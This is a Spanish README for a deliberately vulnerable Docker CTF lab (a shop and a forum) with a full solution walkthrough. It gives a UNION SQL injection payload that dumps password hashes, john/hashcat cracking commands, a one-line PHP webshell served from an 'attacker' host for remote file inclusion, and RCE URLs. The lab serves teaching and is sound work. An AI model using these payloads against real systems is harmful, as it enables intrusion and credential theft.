# CTF — Tienda + Foro (SQLi → crackeo → RFI → RCE)

Laboratorio CTF **deliberadamente vulnerable** en Docker (2 contenedores: web + BD).
Pensado para una presentación de máster.

> ⚠️ **Aviso:** este entorno está lleno de vulnerabilidades a propósito (SQL injection,
> contraseñas débiles, `allow_url_include=On`, RFI). **Solo para uso local y controlado.**
> No lo expongas a ninguna red no confiable.

## Requisitos

- Docker y Docker Compose v2.
- Para el paso de RFI, el host debe permitir que el contenedor le haga una
  conexión de vuelta (ver [Nota de red](#nota-de-red-importante-para-el-rfi)).

## Despliegue

```bash
docker compose up -d --build
```

- Tienda: <http://localhost:8080/tienda/>
- Foro:   <http://localhost:8080/foro/>

Reinicio limpio (vuelve a sembrar la BD):

```bash
docker compose down -v && docker compose up -d --build
```

## Arquitectura

| Contenedor | Rol | Expuesto al host |
|------------|-----|------------------|
| `web` | Apache + PHP 7.4, sirve `/tienda` y `/foro` | sí, `8080:80` |
| `db`  | MariaDB, BD compartida tienda+foro | **no** (solo red interna) |

La base de datos **no** está publicada al host: el único camino hacia ella es la
SQLi de la tienda. Tienda y foro comparten BD y un único usuario de BD, lo que
habilita el salto tienda → foro.

## Camino previsto (solución)

### 1. SQL injection en el buscador de la tienda

El buscador (`/tienda/search.php?q=`) concatena la entrada sin sanear. Inyección
UNION (4 columnas) para volcar los usuarios del foro:

```
' UNION SELECT id, username, password_md5, NULL FROM users -- -
```

En la URL:

```
http://localhost:8080/tienda/search.php?q=%27%20UNION%20SELECT%20id,%20username,%20password_md5,%20NULL%20FROM%20users%20--%20-
```

Devuelve `username` y su hash MD5 para cada usuario. (También explotable con `sqlmap`.)

### 2. Crackeo de los hashes (MD5)

Las contraseñas son del top 1000 de rockyou. Guarda los hashes en `hashes.txt` y:

```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
# o
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

### 3. Login en el foro

El foro no permite registro (botón "Registrarse" → *"Acceso solo por invitación"*).
Entra en <http://localhost:8080/foro/login.php> con cualquier usuario crackeado.

### 4–5. RFI: incluir una webshell remota

Al crear una publicación, el campo **"URL de recurso a incrustar"** (`embed_url`)
se pasa a `include()` en la vista del post → **Remote File Inclusion** (hay
`allow_url_include=On`).

1. Prepara una webshell, p. ej. `payload.php`:
   ```php
   <?php system($_GET['cmd']); ?>
   ```
2. Sírvela desde tu máquina y averigua tu IP:
   ```bash
   ip a                      # p. ej. 192.168.1.20
   python3 -m http.server 8000   # en el directorio de payload.php
   ```
3. Crea un post con:
   ```
   embed_url = http://<tu-ip>:8000/payload.php
   ```
4. Abre el post. El servidor incluye y ejecuta tu PHP remoto.

### 6. RCE

```
http://localhost:8080/foro/post.php?id=<n>&cmd=id
http://localhost:8080/foro/post.php?id=<n>&cmd=whoami     # -> www-data
```

Sin flags: la prueba de resolución es la ejecución de comandos en el contenedor web.

## Nota de red (importante para el RFI)

El RFI necesita que el **contenedor web alcance tu servidor de payload**. Según el
firewall del host, el tráfico contenedor → host puede estar **bloqueado** (síntoma:
el `include` se queda colgado y no aparece la salida de la webshell).

Dos formas de resolverlo:

- **A) Tu IP del host (lo más parecido a un pentest real).** Asegúrate de que el host
  permite el tráfico entrante desde la subred de Docker (p. ej. con `ufw`:
  `sudo ufw allow in on <bridge-docker>` o permitir desde `172.16.0.0/12`; o deshabilitar
  el firewall temporalmente). Luego usa `http://<tu-ip>:8000/payload.php` como arriba.
  El contenedor también resuelve el host como `attacker` (alias `host-gateway`), así que
  `http://attacker:8000/payload.php` funciona igual cuando el firewall lo permite.

- **B) Servidor de payload en la red Docker (independiente del firewall).** Levanta el
  servidor como contenedor en la red del lab:
  ```bash
  docker run --rm --name atacante --network ctf_default \
    -v "$PWD:/srv:ro" -w /srv python:3-alpine python -m http.server 8000
  ```
  y usa `embed_url = http://atacante:8000/payload.php`. Funciona en cualquier host.

## Personalización

- **Productos:** el catálogo trae solo un producto demo (`Camiseta Demo`). Edita
  `db/init/01-schema-seed.sql` para añadir los tuyos (y elimina el demo). Aplica el
  cambio con un reinicio limpio (`down -v && up --build`).
- **Usuarios del foro:** también en `db/init/01-schema-seed.sql`; las contraseñas se
  guardan con `MD5('...')`.

## Tests

Con el stack levantado (y el tráfico contenedor→host permitido para el paso RFI):

```bash
bash tests/run_all.sh      # -> CADENA COMPLETA OK
```

Verifican: stack arriba, catálogo, SQLi UNION revela hashes, login/registro/gating,
y RFI ejecutando PHP remoto.
